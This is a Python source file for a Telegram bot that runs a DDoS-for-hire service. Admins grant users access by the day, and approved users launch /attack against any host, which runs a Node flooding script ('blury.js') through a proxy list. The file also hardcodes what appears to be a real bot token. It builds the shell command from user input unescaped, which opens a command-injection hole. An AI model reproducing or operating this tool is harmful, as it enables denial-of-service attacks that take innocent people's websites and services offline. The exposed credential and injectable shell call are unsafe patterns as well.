import subprocess
import time
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Hardcoded main admin ID (Replace with your Telegram ID)
MAIN_ADMIN_ID = 7123384548  

# Admins set (Main admin is always included)
admin_ids = {MAIN_ADMIN_ID}  

# Approved users storage
approved_users = {}

# Attack management
current_attack = None
attack_lock = threading.Lock()

# Check if user is approved
def is_user_approved(user_id):
    return user_id in approved_users and approved_users[user_id] > time.time()

# Add admin command
async def add_admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != MAIN_ADMIN_ID:
        await update.message.reply_text("Only the main admin can add other admins.")
        return

    try:
        admin_id = int(context.args[0])
        admin_ids.add(admin_id)
        await update.message.reply_text(f"User {admin_id} has been added as an admin.")
    except:
        await update.message.reply_text("Usage: /addadmin <admin_id>")

# Remove admin command
async def remove_admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != MAIN_ADMIN_ID:
        await update.message.reply_text("Only the main admin can remove admins.")
        return

    try:
        admin_id = int(context.args[0])
        if admin_id in admin_ids and admin_id != MAIN_ADMIN_ID:
            admin_ids.remove(admin_id)
            await update.message.reply_text(f"User {admin_id} removed as an admin.")
        else:
            await update.message.reply_text("Admin ID not found or cannot remove the main admin.")
    except:
        await update.message.reply_text("Usage: /removeadmin <admin_id>")

# Add user command
async def add_userid(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in admin_ids:
        await update.message.reply_text("You are not authorized to add users.")
        return

    try:
        target_user_id, days = map(int, context.args)
        approved_users[target_user_id] = time.time() + (days * 86400)
        await update.message.reply_text(f"User {target_user_id} approved for {days} days.")
    except:
        await update.message.reply_text("Usage: /adduserid <user_id> <days>")

# List approved users
async def list_users(update: Update, context: CallbackContext):
    if not approved_users:
        await update.message.reply_text('No approved users.')
        return

    user_list = [
        f"User ID: {user_id}, Days Left: {(expiration - time.time()) / 86400:.1f}"
        for user_id, expiration in approved_users.items()
    ]
    await update.message.reply_text('Approved Users:\n' + '\n'.join(user_list))

# Remove user command
async def remove_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in admin_ids:
        await update.message.reply_text("You are not authorized to remove users.")
        return

    try:
        target_user_id = int(context.args[0])
        if target_user_id in approved_users:
            del approved_users[target_user_id]
            await update.message.reply_text(f"User {target_user_id} removed.")
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Usage: /removeuser <user_id>")

# Attack command
async def attack(update: Update, context: CallbackContext):
    global current_attack

    user_id = update.message.from_user.id
    if not is_user_approved(user_id):
        await update.message.reply_text("You are not approved to use this command.")
        return

    if attack_lock.locked():
        await update.message.reply_text("An attack is already running. Please wait.")
        return

    try:
        host, attack_time, rps, threads = context.args
        attack_time = int(attack_time)

        with attack_lock:
            current_attack = {
                'host': host,
                'user_id': user_id,
                'start_time': time.time(),
                'duration': attack_time,
                'remaining': attack_time
            }

            command = f"node blury.js {host} {attack_time} {rps} {threads} proxy.txt"
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            message = (
                "*🚀 ATTACK INITIATED 🚀*\n\n"
                f"*💣 Host: {host}*\n"
                f"*🔢 User ID: {user_id}*\n"
                f"*🕒 Duration: {attack_time} seconds*"
            )
            await update.message.reply_text(message, parse_mode="Markdown")

    except:
        await update.message.reply_text("Usage: /attack <host> <time> <rps> <threads>")

# Stop attack command
async def stop_attack(update: Update, context: CallbackContext):
    global current_attack

    user_id = update.message.from_user.id
    if user_id not in admin_ids:
        await update.message.reply_text("You are not authorized to stop attacks.")
        return

    if not current_attack:
        await update.message.reply_text("No attack is currently running.")
        return

    current_attack = None
    await update.message.reply_text("Attack stopped.")

# Set up bot application
def main():
    BOT_TOKEN = "7905507211:AAEmQ-yzGvMnWovlFBYOvB7mwvyBbrbnEDE"

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("addadmin", add_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("adduserid", add_userid))
    app.add_handler(CommandHandler("listusers", list_users))
    app.add_handler(CommandHandler("removeuser", remove_user))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stopattack", stop_attack))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
            
